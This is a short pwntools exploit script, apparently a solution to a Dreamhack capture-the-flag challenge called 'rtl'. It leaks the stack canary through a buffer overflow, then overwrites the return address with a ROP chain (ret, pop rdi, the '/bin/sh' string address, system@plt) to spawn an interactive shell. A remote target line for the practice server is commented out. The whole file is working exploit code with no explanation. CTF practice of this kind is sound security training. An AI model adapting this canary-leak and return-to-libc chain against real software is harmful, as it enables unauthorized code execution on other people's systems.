from pwn import *

e = ELF('./rtl')
rop = ROP(e)

LEAK_DUMMY = b'\x41' * 0x39
PAYLOAD_DUMMY = b'\x42' * 0x38
PAYLOAD = b''
CANARY = ''
SYSTEM_PLT = p64(e.plt['system'])
BINSH = p64(list(e.search(b'/bin/sh\x00'))[0])
POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
RET = p64((rop.find_gadget(['ret']))[0])

print('[*] PRE EXPLOIT INFORMATION')
print('[+] SYSTEM FUNC PLT ADDR : ' + hex(u64(SYSTEM_PLT)))
print('[+] /bin/sh\x00 ADDR : ' + hex(u64(BINSH)))
print('[+] pop rdi INFO : ' + hex(u64(POP_RDI)))
print('[+] ret INFO : ' + hex(u64(RET)), end='\n\n')

# LOCAL
p = process('./rtl')

# REMOTE
#p = remote('host3.dreamhack.games', 23025)

p.recvuntil(b'[1] Leak Canary\n')

print('[+] [1] Leak Canary')
p.sendafter(b'Buf: ', LEAK_DUMMY)
p.recvuntil(b'Buf: ' + LEAK_DUMMY)

CANARY = b'\x00' + p.recvuntil(b'\n')[:7]

print('[+] Canary Info : ' + hex(u64(CANARY)), end='\n\n')

PAYLOAD = PAYLOAD_DUMMY + CANARY + b'\x42' * 8 + RET + POP_RDI + BINSH + SYSTEM_PLT

p.recvuntil(b'[2] Overwrite return address\n')
print('[+] [2] Overwrite return address')
p.sendafter(b'Buf: ', PAYLOAD)

p.interactive()
